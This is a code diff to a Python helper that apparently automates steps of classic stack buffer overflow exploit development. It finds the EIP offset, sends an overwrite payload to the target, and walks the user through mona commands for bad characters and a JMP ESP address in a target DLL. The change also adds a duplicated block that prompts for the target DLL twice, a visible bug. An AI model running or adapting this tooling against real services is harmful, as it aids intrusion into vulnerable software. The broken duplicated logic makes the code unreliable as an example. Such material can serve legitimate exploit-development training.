@@ -38,10 +38,11 @@ class Enum:
 
             # Determine EIP offset
             offset = self.get_offset(eip_query)
+            print(f"[*] Offset detected at {offset} bytes\n")
         else:
             offset = args.eip
-
-        print(f"[*] Offset detected at {offset} bytes\n")
+            print(f"[*] Offset set at {offset} bytes\n")
+        
 
         print("[*] Targeting EIP with all 'B's...\n")
         fuzz.send_payload("A" * offset + "B" * 4)
@@ -56,12 +57,17 @@ class Enum:
         print('\n[-] Run: !mona bytearray -b "\\x00"\n')
         print(f"[-] Run: '!mona compare -f bytearray.bin -a {bad_char_esp}'\n")
 
-        print(f"[-] Run: '!mona modules'\n")
-        dll = input("[?] Enter target DLL: ")
+
+        print(f"Run: '!mona modules'\n")
+        dll = input("Enter target DLL: ")
+
+        print(f"Run: '!mona modules'\n")
+        dll = input("Enter target DLL: ")
+
 
         print(f"\n[-] Run: '!mona find -s '\\xff\\xe4' -m {dll}'\n")
 
-        dll_mem = input("[?] Enter target DLL Memory Location: ")
+        dll_mem = input("[?] Enter target DLL Memory Location: ").strip()
 
         self.print_restart_message()
         fuzz.is_target_up()
